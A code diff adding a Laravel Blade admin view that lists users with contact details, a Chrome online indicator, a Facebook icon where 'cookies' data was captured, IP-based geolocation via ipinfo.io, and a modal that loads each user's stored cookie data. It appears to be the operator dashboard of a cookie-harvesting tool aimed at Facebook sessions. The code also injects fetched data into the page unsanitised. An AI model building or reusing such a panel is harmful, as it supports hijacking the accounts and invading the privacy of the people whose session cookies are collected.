@@ -1,0 +1,216 @@
+@extends('admin.layouts.master')
+
+@section('content')
+
+<!-- <style type="text/css">
+  
+  table {border-collapse:collapse; table-layout:fixed; width:310px;}
+       table td {border:solid 1px #fab; width:100px; word-wrap:break-word;}
+</style>
+ -->
+
+
+
+
+
+           <div class="row">
+        <div class="col-xs-12">
+    <div class="box">
+        <div class="box-header">
+   <h3 class="box-title">User Data</h3>
+        </div>
+        <!-- /.box-header -->
+        <div class="box-body">
+            <table id="example1" class="table table-bordered table-striped">
+                     <thead>
+
+                       <tr>
+                   
+                       <th>#</th> 
+                       <th></th>
+                       <th></th>
+                       <td> </td>
+                       <th>Name</th>
+                       <th>Register</th>
+                       <th>Email </th>
+                       <th>Last Seen</th>
+                       <th>Phone</th>
+                       <th>Status</th>
+                       <th>Cookies Data</th>
+                       <th></th>
+                       <th></th>
+                       
+                       
+                     
+                     </tr>
+                     </thead>
+                     <tbody>                       
+@if(!empty($data))
+@php
+ function ip_details($IPaddress) 
+{
+    $json       = file_get_contents("http://ipinfo.io/{$IPaddress}");
+    $details    = json_decode($json);
+    return $details;
+}
+@endphp
+
+@php $i = 1; @endphp
+                       @foreach($data as $datas) 
+                        <tr> 
+                        <td>@php echo $i++; @endphp</td>  
+                        <td><img width="15" height="15" src="@if($datas['live'] == 1) {{url('uploads/chrome.png')}} @else{{url('uploads/chromegrey.png')}} @endif " alt="Italian Trulli"> </td>
+                        <td> @if(!empty($datas['cookies'])) <img height="30" width="30" src="{{url('uploads/facebook.png')}}" alt="Italian Trulli"> @endif</td> 
+                        <td> @php $IPaddress  = ip_details($datas['cookies']['ip']); echo  $IPaddress->country;   @endphp</td> 
+
+
+                       <td>{{$datas['name']}} </td>
+                       <td>@php echo date("d M Y h:i",strtotime($datas['created_at'])); @endphp</td>
+                       <td>{{$datas['email']}}</td>
+
+                       <td>@if (\Carbon\Carbon::parse($datas['last_login'])->toDateString() === date('Y-m-d'))
+                        Today  @php echo date("h:i",strtotime($datas['last_login'])); @endphp
+
+                    @elseif (\Carbon\Carbon::parse($datas['last_login'])->toDateString() === date('Y-m-d', strtotime('-1 day')))
+
+                    Yesterday @php echo date("h:i",strtotime($datas['last_login'])); @endphp
+                    @else
+                       @php echo date("d M y h:i",strtotime($datas['last_login'])); @endphp
+                    @endif</td>
+
+                    
+                       <td>{{$datas['phone']}}</td> 
+                       <td> @if($datas['status'] == 1) <span style="color: green"> Active</span>  @else <span style="color: red"> Pending Review</span> @endif </td>
+                       <td> <button type="button" class="btn btn-info btn-lg userdT" data-user-id ="{{$datas['id']}}" data-toggle="modal" data-target="#myModal">View</button></td>  
+
+                       <td><a href="{{url('user/edit/'.$datas['id'])}}" class="btn btn-info btn-lg">Edit</a>
+</td>                    
+
+                       <td><a href="{{url('user/delete/'.$datas['id'])}}" class="btn btn-info btn-lg">Delete</a>
+</td>
+
+                        
+                      </tr> 
+                        @endforeach 
+                        @else
+                       <tr> No Data Found </tr>
+                        @endif
+                     </tbody>
+                 
+                   </table>
+                 </div>
+        <!-- /.box-body -->
+    </div>
+        </div>
+    </div>
+
+
+
+
+
+
+
+
+
+<div class="container">
+ 
+  <div class="modal fade" id="myModal" role="dialog">
+    <div class="modal-dialog modal-lg" style="overflow:hidden; word-wrap:break-word">
+    
+      <!-- Modal content-->
+      <div class="modal-content">
+        <div class="modal-header">
+          <button type="button" class="close" data-dismiss="modal">&times;</button>
+          <h4 class="modal-title">Cookies Data</h4>
+        </div>
+        <div class="modal-body getdata">
+
+          
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+        </div>
+      </div>
+      
+    </div>
+  </div>
+  
+</div>
+
+
+<div class="container">
+ 
+  <div class="modal fade" id="myModal1" role="dialog">
+    <div class="modal-dialog modal-lg">
+    
+      <!-- Modal content-->
+      <div class="modal-content">
+        <div class="modal-header">
+          <button type="button" class="close" data-dismiss="modal">&times;</button>
+          <h4 class="modal-title">Cookies Data</h4>
+        </div>
+        <div class="modal-body getcookies">
+
+          
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+        </div>
+      </div>
+      
+    </div>
+  </div>
+  
+</div>
+
+
+
+@endsection
+
+
+
+@section('javascript')
+<script type="text/javascript">
+
+$(document).ready(function(){
+   
+      $("#example1").on("click", ".userdT", function(){
+      var id = $(this).data("user-id");
+
+     var url = "{{url('/getcookies')}}";
+
+        $.ajax({
+            url: url+'/'+id,
+            type: 'GET',  
+            data: {'id':id},          
+            success: function (data) {
+                $('.getdata').html(data);
+            }
+        });
+    });
+
+
+        
+          $(".getcookieData").click(function(){
+      var id = $(this).data("attr-id");
+
+      alert(id);
+
+     var url = "{{url('/cookiedata')}}";
+
+        $.ajax({
+            url: url+'/'+id,
+            type: 'GET',  
+            data: {'id':id},          
+            success: function (data) {
+                $('.getcookies').html(data);
+            }
+        });
+    });
+});
+
+
+
+
+</script>
+@stop
